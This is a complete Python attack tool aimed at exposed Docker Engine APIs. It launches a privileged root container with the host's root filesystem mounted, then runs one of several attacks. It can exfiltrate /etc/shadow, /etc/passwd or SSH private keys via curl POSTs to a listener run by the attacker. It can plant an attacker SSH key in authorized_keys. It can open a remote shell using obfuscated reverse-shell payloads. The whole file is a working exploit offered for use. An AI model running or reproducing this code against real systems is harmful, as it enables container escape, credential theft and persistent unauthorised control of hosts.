
#!/usr/bin/env python3
import argparse, requests, json, time, os, socket, fcntl, struct, threading, base64
from http.server import BaseHTTPRequestHandler, HTTPServer

def get_eth0_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', b'eth0'[:15]))[20:24])
    except Exception:
        return "127.0.0.1"

def choose_docker_image(api_url):
    try:
        r = requests.get(f"{api_url}/images/json")
        r.raise_for_status()
        images = r.json()
    except Exception as e:
        print(f"[-] Failed to fetch image list: {e}")
        return None
    choices = []
    print("\n=== Available Docker Images ===")
    for idx, img in enumerate(images):
        tags = img.get("RepoTags") or []
        digests = img.get("RepoDigests") or []
        tagline = ", ".join(tags or digests or ["<untagged>"])
        print(f"[{idx}] {tagline}")
        choices.append(tagline)
    try:
        selection = int(input("Select image by number: "))
        selected = choices[selection].split(",")[0].strip()
        print(f"[+] Selected image: {selected}")
        return selected
    except Exception as e:
        print(f"[-] Invalid selection: {e}")
        return None

def build_reverse_shell_payloads(ip, port):
    shells = []
    payload_os = f'import socket,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/sh")'
    shells.append(f'echo {base64.b64encode(payload_os.encode()).decode()} | base64 -d | python3')
    shells.append(f'bash -i >& /dev/tcp/{ip}/{port} 0>&1')
    payload_sub = f'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
    shells.append(f'echo {base64.b64encode(payload_sub.encode()).decode()} | base64 -d | python3')
    return shells

listener_shutdown = threading.Event()
reverse_shell_connected = threading.Event()

def start_exfil_listener(port):
    class ExfilHandler(BaseHTTPRequestHandler):
        def do_POST(self):
            length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(length)
            try:
                decoded = base64.b64decode(post_data).decode(errors="ignore")
            except Exception:
                decoded = post_data.decode(errors="ignore")
            print(f"\n=== {self.path} ===\n{decoded}")
            self.send_response(200)
            self.end_headers()
            if "/shadow" in self.path or "/passwd" in self.path or "/ssh/" in self.path:
                listener_shutdown.set()
    def _run():
        server = HTTPServer(('0.0.0.0', port), ExfilHandler)
        print(f"[+] Listening for exfil on port {port}")
        while not listener_shutdown.is_set():
            server.handle_request()
    threading.Thread(target=_run, daemon=True).start()

def start_reverse_shell_listener(port):
    def shell_session(sock):
        print("[+] Reverse shell connected! Type 'exit' to quit.\n")
        reverse_shell_connected.set()
        try:
            while True:
                cmd = input("$ ")
                if cmd.strip().lower() in ["exit", "quit"]:
                    break
                sock.sendall(cmd.encode() + b"\n")
                data = sock.recv(4096)
                print(data.decode(errors="ignore"), end="")
        except Exception as e:
            print("[-] Shell error:", e)
        finally:
            sock.close()
    def _listen():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("0.0.0.0", port))
            s.listen(1)
            print(f"[+] Listening for reverse shell on port {port}...")
            sock, addr = s.accept()
            shell_session(sock)
    threading.Thread(target=_listen, daemon=True).start()

def exec_command(container_id, command):
    print(f"[*] Executing: {command}")
    payload = {
        "AttachStdout": True,
        "AttachStderr": True,
        "Cmd": ["sh", "-c", command]
    }
    r = requests.post(f"{target}/containers/{container_id}/exec", json=payload)
    try:
        exec_id = r.json().get("Id")
        if not exec_id:
            print(f"[-] Failed to create exec command: {r.text}")
            cleanup_container(container_id)
            exit(1)
    except Exception as e:
        print(f"[-] Error parsing exec creation response: {e}")
        cleanup_container(container_id)
        exit(1)
    r = requests.post(f"{target}/exec/{exec_id}/start", json={"Detach": False, "Tty": False})
    if r.status_code != 200:
        print(f"[-] Failed to start exec: {r.status_code} {r.text}")
        cleanup_container(container_id)
        exit(1)
    return True

def create_container(image):
    config = {
        "Image": image,
        "User": "0",
        "Cmd": ["sh", "-c", "while true; do sleep 1; done"],
        "HostConfig": {
            "Binds": ["/:/host"],
            "Privileged": True
        }
    }
    r = requests.post(f"{target}/containers/create", json=config)
    container_id = r.json()["Id"]
    requests.post(f"{target}/containers/{container_id}/start")
    print(f"[+] Container {container_id} started")
    time.sleep(2)
    return container_id

def cleanup_container(container_id):
    try:
        requests.post(f"{target}/containers/{container_id}/stop")
        time.sleep(1)
        requests.delete(f"{target}/containers/{container_id}?force=true")
        print("[+] Container cleaned up.")
    except Exception as e:
        print(f"[!] Cleanup failed: {e}")

parser = argparse.ArgumentParser()
parser.add_argument("--target", required=True)
parser.add_argument("--attack", required=True, choices=["dump-shadow", "dump-passwd", "exfil-ssh", "inject-key", "reverse-shell"])
parser.add_argument("--user", default="root")
parser.add_argument("--pubkey", help="Path to your public key")
parser.add_argument("--listen-port", type=int, default=8000)
parser.add_argument("--reverse-port", type=int, default=9001)
parser.add_argument("--attacker-ip", default=get_eth0_ip())
args = parser.parse_args()

target = args.target
attack = args.attack
username = args.user
pubkey_path = args.pubkey
listen_port = args.listen_port
attacker_ip = args.attacker_ip
reverse_port = args.reverse_port

image = choose_docker_image(target)
if not image:
    print("[-] No image selected. Exiting.")
    exit(1)

try:
    container_id = create_container(image)
    if attack in ["dump-shadow", "dump-passwd", "exfil-ssh"]:
        start_exfil_listener(listen_port)

    if attack == "dump-shadow":
        cmd = f"base64 /host/etc/shadow | curl -X POST -d @- http://{attacker_ip}:{listen_port}/shadow"
        exec_command(container_id, cmd)

    elif attack == "dump-passwd":
        cmd = f"base64 /host/etc/passwd | curl -X POST -d @- http://{attacker_ip}:{listen_port}/passwd"
        exec_command(container_id, cmd)

    elif attack == "exfil-ssh":
        base = "/host/root/.ssh" if username == "root" else f"/host/home/{username}/.ssh"
        for key in ["id_rsa", "id_ed25519", "id_ecdsa"]:
            path = f"{base}/{key}"
            name = f"{username}_{key}"
            cmd = f"base64 {path} | curl -X POST -d @- http://{attacker_ip}:{listen_port}/ssh/{name}"
            if exec_command(container_id, cmd):
                break

    elif attack == "inject-key":
        if not pubkey_path or not os.path.exists(pubkey_path):
            print("[-] Missing pubkey path")
            exit(1)
        with open(pubkey_path, "r") as f:
            pubkey = f.read().strip().replace('"', '\"')
        ssh_dir = "/host/root/.ssh" if username == "root" else f"/host/home/{username}/.ssh"
        exec_command(container_id, f"mkdir -p {ssh_dir} && chmod 700 {ssh_dir}")
        exec_command(container_id, f'echo "{pubkey}" >> {ssh_dir}/authorized_keys && chmod 600 {ssh_dir}/authorized_keys')

    elif attack == "reverse-shell":
        start_reverse_shell_listener(reverse_port)
        for i, shell in enumerate(build_reverse_shell_payloads(attacker_ip, reverse_port), 1):
            print(f"[*] Attempting reverse shell payload {i}...")
            exec_command(container_id, shell)
            if reverse_shell_connected.wait(timeout=15):
                print("[+] Reverse shell connected!")
                break
            else:
                print("[!] Payload failed or timed out.\n")
        else:
            print("[-] All payloads failed.")

    if attack in ["dump-shadow", "dump-passwd", "exfil-ssh"]:
        print("[*] Waiting for exfil...")
        listener_shutdown.wait()
        print("[+] Exfil complete.")

except KeyboardInterrupt:
    print("[!] Interrupted.")

finally:
    if 'container_id' in locals():
        cleanup_container(container_id)
